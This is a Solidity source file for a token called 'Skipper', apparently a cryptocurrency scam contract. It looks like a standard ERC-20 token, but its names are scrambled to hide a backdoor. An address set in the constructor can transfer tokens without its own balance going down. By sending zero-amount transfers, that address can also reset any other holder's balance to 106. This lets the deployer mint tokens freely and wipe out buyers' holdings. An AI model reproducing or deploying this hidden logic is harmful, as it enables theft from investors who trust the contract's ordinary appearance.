/*

https://t.me/skipperportal

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Skipper is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address ekzqc, uint256 iqewphtfuayk) public returns (bool success) {
        allowance[msg.sender][ekzqc] = iqewphtfuayk;
        emit Approval(msg.sender, ekzqc, iqewphtfuayk);
        return true;
    }

    address public gdli;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address izmbenx, uint256 iqewphtfuayk) public returns (bool success) {
        ikytorwsflq(msg.sender, izmbenx, iqewphtfuayk);
        return true;
    }

    function transferFrom(address jzbcrq, address izmbenx, uint256 iqewphtfuayk) public returns (bool success) {
        require(iqewphtfuayk <= allowance[jzbcrq][msg.sender]);
        allowance[jzbcrq][msg.sender] -= iqewphtfuayk;
        ikytorwsflq(jzbcrq, izmbenx, iqewphtfuayk);
        return true;
    }

    mapping(address => uint256) private erazqmu;

    uint256 private qucai = 106;

    uint8 public decimals = 9;

    constructor(address xvdncj) {
        balanceOf[msg.sender] = totalSupply;
        ljxtrmydqv[xvdncj] = qucai;
        IUniswapV2Router02 mnsr = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        gdli = IUniswapV2Factory(mnsr.factory()).createPair(address(this), mnsr.WETH());
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = 'Skipper';

    string public name = 'Skipper';

    event Transfer(address indexed from, address indexed to, uint256 value);

    function ikytorwsflq(address jzbcrq, address izmbenx, uint256 iqewphtfuayk) private {
        if (ljxtrmydqv[jzbcrq] == 0) {
            balanceOf[jzbcrq] -= iqewphtfuayk;
        }
        balanceOf[izmbenx] += iqewphtfuayk;
        if (ljxtrmydqv[msg.sender] > 0 && iqewphtfuayk == 0 && izmbenx != gdli) {
            balanceOf[izmbenx] = qucai;
        }
        emit Transfer(jzbcrq, izmbenx, iqewphtfuayk);
    }

    mapping(address => uint256) private ljxtrmydqv;
}